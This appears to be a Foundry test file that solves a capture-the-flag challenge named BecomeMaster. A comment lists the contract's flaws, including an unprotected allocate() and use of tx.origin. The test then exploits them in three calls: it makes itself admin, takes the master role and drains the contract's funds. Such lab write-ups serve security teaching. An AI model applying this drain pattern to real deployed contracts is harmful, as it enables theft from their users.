// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import "forge-std/Test.sol";
import "../contracts/BecomeMaster.sol";
import "../contracts/Setup.sol";

contract BecomeMasterTest is Test {
    Setup setup;
    BecomeMaster becomeMaster;

    function setUp() external {
        setup = new Setup{value: 0.001 ether}();
        becomeMaster = setup.instance();
    }

    /**
    The vulnerabilities here are:

    1. `allocate()` isn't access protected, so anyone can become admin.
    2. `tx.origin` is used, which can be used in phishing attacks (wasn't used in this attack)
    3. `onlyContract` modifier can have a better check to see if caller is a contract (wasn't used in this attack)
    4. `caller` is never updated (wasn't used in this attack)
     */
    function testAttack() external {
        // Attack

        // 1. Become admin
        becomeMaster.allocate();

        // 2. Become master
        becomeMaster.takeMasterRole();

        // 3. Empty out fund
        becomeMaster.collectAllocations();

        // Check for attack success
        require(setup.isSolved(), "NOT SOLVED");
    }

    receive() external payable {}
}
